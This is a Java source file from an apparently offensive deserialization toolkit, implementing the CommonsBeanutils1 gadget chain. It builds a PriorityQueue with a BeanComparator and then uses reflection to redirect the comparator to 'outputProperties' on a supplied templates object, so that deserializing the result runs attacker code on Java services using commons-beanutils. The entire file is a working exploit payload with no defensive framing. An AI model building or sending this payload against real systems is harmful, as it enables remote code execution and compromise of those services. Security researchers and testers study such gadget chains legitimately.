package com.summersec.attack.deser.payloads;

import com.summersec.attack.deser.payloads.annotation.Dependencies;
import com.summersec.attack.deser.util.Reflections;
import java.math.BigInteger;
import java.util.Comparator;
import java.util.PriorityQueue;
import org.apache.commons.beanutils.BeanComparator;

@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
public class CommonsBeanutils1 implements ObjectPayload {
    @Override
    public Object getObject(Object templates) throws Exception {
        BeanComparator comparator = new BeanComparator("lowestSetBit");


        PriorityQueue<Object> queue = new PriorityQueue(2, (Comparator<? super Object>)comparator);

        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));


        Reflections.setFieldValue(comparator, "property", "outputProperties");


        Object[] queueArray = (Object[])Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = templates;

        return queue;
    }
}



